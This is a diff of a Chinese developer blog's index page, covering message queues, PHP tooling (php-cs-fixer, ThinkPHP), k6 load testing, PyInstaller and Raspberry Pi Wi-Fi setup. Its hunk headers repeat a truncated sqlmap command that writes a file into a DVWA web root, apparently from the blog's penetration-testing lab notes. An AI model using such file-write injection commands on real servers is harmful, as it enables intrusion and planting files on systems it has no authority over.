+<td>RocketMQ</td>
+<td>性能好、稳定可靠、有活跃的中文社区、使用 Java 开发，容易进行二次开发、特点响应快</td>
+<td>兼容性较差</td>
+</tr>
+<tr>
+<td>Kafka</td>
+<td>兼容性极好、设计上大量使用了批量和异步的思想，有超高的性能</td>
+<td>由于 “先攒一波再一起处理” 的设计，时延较高，不太适合在线业务场景</td>
+</tr>
+</tbody></table>
+<h3 id="7">服务器&其它方面</h3>
+<h4 id="7.1">swoole</h4>
+
+<p>Swoole是一个面向生产环境的PHP 异步网络通信引擎，使PHP 开发人员可以编写高性能的异步并发TCP、UDP、Unix Socket、HTTP，WebSocket 服务</p>
+<h4 id="7.2">phpunit</h4>
+
+<p>PHPUnit 是 PHP 程式语言中最常见的单元测试 (unit testing) 框架，PHPUnit 是参考 xUnit 架构利用 PHP 实作出来。</p>
+<ol>
+<li>针对类 Example 的测试写在类 ExampleTest 中, ExampleTest 继承自 TestCase</li>
+<li>对于方法的测试命名为 test* 的公用方法</li>
+<li>在测试方法内，类似于 assertEquals() 的断言方法用来对实际值和预期值的匹配做出验证</li>
+</ol>
+<h4 id="7.3">php-cs-fixer</h4>
+
+<p>php-cs-fixer 是个代码格式化工具，格式化的标准是 PSR-1、PSR-2 以及一些 symfony 的标准。</p>
+<ul>
+<li>–verbose 用于展示应用了的规则<blockquote>
+<p>–verbose</p>
+</blockquote>
+</li>
+<li>–using-cache 不使用缓存<blockquote>
+<p>–using-cache&#x3D;no</p>
+</blockquote>
+</li>
+<li>–config 指定配置文件<blockquote>
+<p>–config&#x3D;.php-cs-fixer.php</p>
+</blockquote>
+</li>
+<li>–level 用于控制需要使用的规则层级（默认psr2）<blockquote>
+<p>–level&#x3D;psr0<br>–level&#x3D;psr1<br>–level&#x3D;psr2<br>–level&#x3D;symfony</p>
+</blockquote>
+</li>
+<li>–fixers 默认情况下执行的是 PSR-2 的所有选项以及一些附加选项（主要是 symfony 相关的）。还有一些属于『贡献级别』的选项，你可以通过 –fixers 选择性的添加，–fixers 的多个条件要用逗号分开<blockquote>
+<p>–fixers&#x3D;linefeed,short_tag,indentation</p>
+</blockquote>
+</li>
+<li>-name_of_fixer 设定禁用哪些选项。如果同时设定了 –fixers 和 -name_of_fixer，前者的优先级更高</li>
+<li>–dry-run 和 –diff 可以显示出需要修改的汇总，但是并不实际修改<blockquote>
+<p>.&#x2F;vendor&#x2F;bin&#x2F;php-cs-fixer fix –verbose –diff –dry-run</p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment"># vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php --dry-run --diff</span></span><br><span class="line"><span class="comment"># vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$finder</span> = PhpCsFixer\Finder::create()</span><br><span class="line">    -&gt;<span class="keyword">in</span>(__DIR__)</span><br><span class="line">    -&gt;name(<span class="string">&#x27;*.php&#x27;</span>)</span><br><span class="line">    -&gt;notName(<span class="string">&#x27;*.blade.php&#x27;</span>); // 排除一些文件类型</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> (new PhpCsFixer\Config())</span><br><span class="line">    -&gt;setUsingCache(<span class="literal">false</span>)  // 禁用缓存</span><br><span class="line">    -&gt;setRules([</span><br><span class="line">        <span class="string">&#x27;@PSR12&#x27;</span> =&gt; <span class="literal">true</span>,                      // 使用 PSR-12 标准</span><br><span class="line">        <span class="string">&#x27;no_unused_imports&#x27;</span> =&gt; <span class="literal">true</span>,            // 移除未使用的导入</span><br><span class="line">        <span class="string">&#x27;standardize_not_equals&#x27;</span> =&gt; <span class="literal">true</span>,       // 使用 `!==` 而不是 `&lt;&gt;`</span><br><span class="line">        <span class="string">&#x27;array_indentation&#x27;</span> =&gt; <span class="literal">true</span>,            // 数组缩进一致</span><br><span class="line">        <span class="string">&#x27;binary_operator_spaces&#x27;</span> =&gt; [<span class="string">&#x27;default&#x27;</span> =&gt; <span class="string">&#x27;align&#x27;</span>],  // 二元运算符对齐</span><br><span class="line">        <span class="string">&#x27;no_extra_blank_lines&#x27;</span> =&gt; <span class="literal">true</span>,         // 删除多余空行</span><br><span class="line">        <span class="string">&#x27;visibility_required&#x27;</span> =&gt; [<span class="string">&#x27;elements&#x27;</span> =&gt; [<span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;method&#x27;</span>]],  // 强制声明可见性</span><br><span class="line">        <span class="string">&#x27;no_trailing_whitespace&#x27;</span> =&gt; <span class="literal">true</span>,       // 删除行尾空白</span><br><span class="line">        <span class="string">&#x27;linebreak_after_opening_tag&#x27;</span> =&gt; <span class="literal">true</span>,  // 在 PHP 开标签后换行</span><br><span class="line">        <span class="string">&#x27;cast_spaces&#x27;</span> =&gt; [<span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;single&#x27;</span>], // 类型转换间隔为单空格</span><br><span class="line">        <span class="string">&#x27;align_multiline_comment&#x27;</span> =&gt; <span class="literal">true</span>,      // 多行注释对齐</span><br><span class="line">        <span class="string">&#x27;ternary_operator_spaces&#x27;</span> =&gt; <span class="literal">true</span>,      // 三元运算符间空格</span><br><span class="line">        <span class="string">&#x27;no_blank_lines_after_phpdoc&#x27;</span> =&gt; <span class="literal">true</span>,  // PHPDoc 后不允许空行</span><br><span class="line">        <span class="string">&#x27;method_argument_space&#x27;</span> =&gt; [<span class="string">&#x27;on_multiline&#x27;</span> =&gt; <span class="string">&#x27;ensure_fully_multiline&#x27;</span>],  // 方法参数一致性</span><br><span class="line">    ])</span><br><span class="line">    -&gt;setFinder(<span class="variable">$finder</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="7.4">docker多版本启动共用</h4>
+
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/php-structure/">
+                PHP框架
             </a>
         </h1>
         <div class="post-info">
@@ -1275,43 +882,23 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     
         <div class="content">
-            <p>文章</p>
-<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="微服务-dubbo-zookeeper"><a href="#微服务-dubbo-zookeeper" class="headerlink" title="微服务 dubbo - zookeeper"></a>微服务 dubbo - zookeeper</h2><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="undertow-对比-tomcat"><a href="#undertow-对比-tomcat" class="headerlink" title="undertow 对比 tomcat"></a>undertow 对比 tomcat</h3>
-        </div>
-    
+            <h2 id="thinkpkp-讨论"><a href="#thinkpkp-讨论" class="headerlink" title="thinkpkp 讨论"></a>thinkpkp 讨论</h2><h3 id="thinkphp-6以上适用命令"><a href="#thinkphp-6以上适用命令" class="headerlink" title="thinkphp 6以上适用命令"></a>thinkphp 6以上适用命令</h3><ul>
+<li>创建单例</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think</span><br></pre></td></tr></table></figure>
+<ul>
+<li>创建多例</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-multi-app</span><br></pre></td></tr></table></figure>
+<ul>
+<li>创建两个模型</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php think build admin</span><br><span class="line">php think build api</span><br></pre></td></tr></table></figure>
+<ul>
+<li>创建多层试图</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-view</span><br></pre></td></tr></table></figure>
 
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/system-migration/">
-                系统迁移
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/Linux/">Linux</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h2 id="系统文件迁移"><a href="#系统文件迁移" class="headerlink" title="系统文件迁移"></a>系统文件迁移</h2><p>安装必需工具</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install rsync mailutils  <span class="comment"># 对于 Debian/Ubuntu</span></span><br><span class="line"><span class="built_in">sudo</span> yum install rsync mailx          <span class="comment"># 对于 CentOS</span></span><br></pre></td></tr></table></figure>
-
-<p>backup_and_migrate.sh</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要变量</span></span><br><span class="line">SOURCE_USER=<span class="string">&quot;source_user&quot;</span></span><br><span class="line">SOURCE_HOST=<span class="string">&quot;source_host&quot;</span></span><br><span class="line">SOURCE_DIR=<span class="string">&quot;/path/to/source/directory/&quot;</span></span><br><span class="line">TARGET_USER=<span class="string">&quot;target_user&quot;</span></span><br><span class="line">TARGET_HOST=<span class="string">&quot;target_host&quot;</span></span><br><span class="line">TARGET_DIR=<span class="string">&quot;/path/to/target/directory/&quot;</span></span><br><span class="line">BACKUP_DIR=<span class="string">&quot;/path/to/backup/directory/&quot;</span></span><br><span class="line">LOG_FILE=<span class="string">&quot;migration.log&quot;</span></span><br><span class="line">EMAIL_RECIPIENT=<span class="string">&quot;admin@example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建备份</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;创建备份...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$BACKUP_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查备份成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份成功，保存在 <span class="variable">$BACKUP_DIR</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Backup Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行迁移</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;开始迁移...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$TARGET_USER</span>@<span class="variable">$TARGET_HOST</span>:<span class="variable">$TARGET_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查迁移成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移成功！从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份和迁移成功！日志详情见 <span class="variable">$LOG_FILE</span>&quot;</span> | mail -s <span class="string">&quot;Server Migration Success&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Migration Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出完成信息</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;备份和迁移完成：从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span> 和 <span class="variable">$BACKUP_DIR</span>&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="mongo-数据迁移"><a href="#mongo-数据迁移" class="headerlink" title="mongo 数据迁移"></a>mongo 数据迁移</h2><p><a target="_blank" rel="noopener" href="https://www.mongodb.com/zh-cn/docs/ops-manager/current/tutorial/migrate-member-to-new-hardware/">将副本集成员迁移到新服务器</a></p>
 
         </div>
     
@@ -1323,8 +910,8 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/tree/">
-                树 ADT
+            <a href="/2026/09/19/pressure-testing/">
+                压测工具集合
             </a>
         </h1>
         <div class="post-info">
@@ -1334,7 +921,7 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
             
             
                 <span class="category">
-                    <a href="/categories/AI/">AI</a>
+                    <a href="/categories/测试工具/">测试工具</a>
                 </span>
             
         </div>
@@ -1342,45 +929,159 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     
         <div class="content">
-            <pre class="mermaid">graph LR
-    A[树] --> B[二叉树]
-    B[二叉树] --> C[完全二叉树]
-    C[完全二叉树] --> D[满二叉树]
-    C[完全二叉树] --> E[堆]
-    E[堆] --> F[大顶堆]
-    E[堆] --> G[小顶堆]
-    B[二叉树] --> H[二叉查找树]
-    B[二叉树] --> I[平衡二叉树]
-    B[二叉树] --> J[平衡二叉查找树]
-    J[平衡二叉查找树] --> K[红黑树]
-    J[平衡二叉查找树] --> L[AVL]
-    A[树] --> M[N叉树]
-    M[N叉树] --> N[B树]
-    M[N叉树] --> O[B+树]</pre>
+            <h1 id="并发请求处理"><a href="#并发请求处理" class="headerlink" title="并发请求处理"></a>并发请求处理</h1><ul>
+<li>HTTP&#x2F;HTTPS 接口：测试 Web API、RESTful 接口的吞吐量、QPS（每秒请求数）。</li>
+<li>数据库查询：高并发查询数据库，看是否会出现锁等待、死锁、超时等问题。</li>
+<li>后台任务：队列、定时任务（如 RabbitMQ、Kafka）在高负载下的稳定性。</li>
+</ul>
+<h2 id="k6"><a href="#k6" class="headerlink" title="k6"></a>k6</h2><p>k6 是一个压力测试套件，使用 golang 编写。主要特性有：</p>
+<ul>
+<li>提供了友好的 CLI 工具</li>
+<li>使用 JavaScript 代码编写测试用例</li>
+<li>可以根据性能条件设置阈值，表明成功还是失败</li>
+</ul>
+<p>k6 没有使用 nodejs 而是 golang 程序，通过包裹了一个 JavaScript 运行时来运行 JavaScript 脚本，因此不能直接使用 npm 包以及 Nodejs 提供的一些 API。</p>
+<p>同时，k6 在运行测试时，没有启动浏览器，主要用于测试页面以及 API 加载速度。k6 提供了通过网络请求（HAR）生成测试脚本的方法，实现更简便的测试脚本编写，以及 session 的维护。</p>
 
-<p><img src="/images/tree.png"></p>
-<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>每一个节点最多两个子节点</p>
-<p><img src="/images/tree-ercha.png"></p>
-<p>前序遍历<br>遍历顺序是根节点-&gt;左子树-&gt;右子树<br>遍历的得到的序列是：<code>1 2 4 5 3 6 7</code></p>
-<p>中序遍历<br>遍历顺序是左子树-&gt;根节点-&gt;右子树<br>遍历的得到的序列是：<code>4 2 5 1 6 3 7</code></p>
-<p>后序遍历<br>遍历顺序是左子树-&gt;右子树-&gt;根节点<br>遍历的得到的序列是：<code>4 5 2 6 7 3 1</code></p>
-<p>满二叉树</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底层</span><br><span class="line">2.除了叶子节点，每个节点都有左、由两个子节点</span><br></pre></td></tr></table></figure>
+        </div>
+    
 
-<p>完全二叉树</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底下两层</span><br><span class="line">2.最后一层的子节点，都靠左排列</span><br><span class="line">3.除了最后一层，其它层的节点个数，都要达到最大</span><br></pre></td></tr></table></figure>
+</div>
+            
+                
+<div class="post">
 
-<p>二叉查找树</p>
-<p><img src="/images/tree-erchachaozhao.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.树中的每一个节点的值</span><br><span class="line">2.都要大于左子树中每个节点的值</span><br><span class="line">3.都要小于右子树中每个节点的值</span><br></pre></td></tr></table></figure>
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/python-interview/">
+                Golang 深浅
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/后端/">后端</a>
+                </span>
+            
+        </div>
+    </div>
 
-<p>AVL树</p>
-<p><img src="/images/tree-erchachazhao-to-avl.png"></p>
-<p>红黑树</p>
-<p><img src="/images/tree-honghei.png"></p>
-<p>B树</p>
-<p>B+树</p>
+    
+        <div class="content">
+            <!-- * [基础](#1)
+    * [进程、线程、Goroutine(协程)区别](#1.1)
+    * [make和new区别](#1.2)
+    * [数组和切片区别](#1.3)
+* [GMP协程调度器](#2)
+    * [调度器策略](#2.1)
+    * [调度器的生命周期](#2.2)
+* [并发 sync](#3)
+    * [通道 - channel](#3.1)
+    * [互斥锁 Mutex 与 读写锁 RWMutex 区别](#3.2)
+    * [并发Map - sync.Map](#3.3)
+    * [线程池 - sync.Pool](#3.4)
+* [内存](#4)
+    * [CG](#4.1)
+* [微服务之间通信方式 rpc Grpc http](#4) -->
 
+<h1 id="打包-pyinstalller"><a href="#打包-pyinstalller" class="headerlink" title="打包 pyinstalller"></a>打包 pyinstalller</h1><h2 id="单个文件打包"><a href="#单个文件打包" class="headerlink" title="单个文件打包"></a>单个文件打包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.执行命令</span></span><br><span class="line">pyinstaller -F xxx.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.去生成的dist文件夹找xxx.exe运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.运行成功，xxx.exe则为可执行文件，删除其它文件</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="打包多文件"><a href="#打包多文件" class="headerlink" title="打包多文件"></a>打包多文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.执行命令，xxx.py为程序入口文件</span></span><br><span class="line">pyinstall -D xxx.py </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.删除生成的bulid和dist文件夹,仅保留xxx.spec文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.修改xxx.spec文件,详见2.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.执行命令</span></span><br><span class="line">pyinstaller -F xxx.spec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.去dist文件夹下找xxx.exe文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.运行成功，删除临时文件目录build；dist目录为打包的结果，可执行文件和其它程序运行的关联文件都在这个目录</span></span><br></pre></td></tr></table></figure>
+
+
+<p>conda 和 venv 差不多</p>
+<p>1️⃣ venv（Python 自带虚拟环境）</p>
+<pre><code>作用：创建一个 隔离的 Python 环境，不影响系统 Python。
+
+仅管理 Python 包，不管底层 C 库或系统库。
+</code></pre>
+<p>2️⃣ conda（跨语言包 + 环境管理器）</p>
+<pre><code>作用：创建隔离环境 + 安装包 + 管理底层依赖
+
+不仅支持 Python，还支持 R、C/C++ 库。
+</code></pre>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/raspberry-pi/">
+                Raspberry Pi 树莓派
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/单片机/">单片机</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>树莓派的开发探索-基本篇 环境基于(Raspberry Pi OS)</p>
+<h2 id="单片机开发与探索"><a href="#单片机开发与探索" class="headerlink" title="单片机开发与探索"></a>单片机开发与探索</h2><h3 id="无需显示器连WIFI"><a href="#无需显示器连WIFI" class="headerlink" title="无需显示器连WIFI"></a>无需显示器连WIFI</h3><blockquote>
+<p>树莓派系统连接原理</p>
+<blockquote>
+<p>用户可以在未启动树莓派的状态下单独修改 <code>/boot/wpa_supplicant.conf</code> 文件配置 WiFi 的 SSID 和密码，这样树莓派启动后会自行读取 <code>wpa_supplicant.conf</code> 配置文件连接 WiFi 设备。</p>
+</blockquote>
+</blockquote>
+<ul>
+<li><p>制作树莓派系统(Raspberry Pi OS)在sd里面不多赘述</p>
+</li>
+<li><p>在电脑中打开sd卡根目录创建名字为wpa_supplicant.conf 的文件</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line">network=&#123;</span><br><span class="line">	ssid=<span class="string">&quot;12345678&quot;</span></span><br><span class="line">	psk=<span class="string">&quot;88888888&quot;</span></span><br><span class="line">	key_mgmt=WPA-PSK</span><br><span class="line">	priority=1  <span class="comment"># 连接优先级，数字越大优先级越高（不可以是负数）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>开机启动树莓派即可连接WIFI</li>
+</ul>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/redis/">
+                Redis
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/数据库/">数据库</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            
         </div>
     
 
@@ -1432,15 +1133,15 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/19/shell/">Shell</a>
+                <a class="footer-post" href="/2026/09/19/wireshark/">Wireshark</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/19/social-engineering/">社工库工具</a>
+                <a class="footer-post" href="/2026/09/19/xss/">XSS跨站脚本攻击</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/19/software-structure/">软件架构演变</a>
+                <a class="footer-post" href="/2026/09/19/pantesting-note/">渗透笔记</a>
             </li>
             
         </ul>
@@ -1462,11 +1163,11 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/%E8%AF%AD%E8%A8%80/">语言</a>
+            <a class="footer-post" href="/categories/%E7%9F%A5/">知</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/%E7%9F%A5/">知</a>
+            <a class="footer-post" href="/categories/%E8%AF%AD%E8%A8%80/">语言</a>
         </li>
         
     </ul>
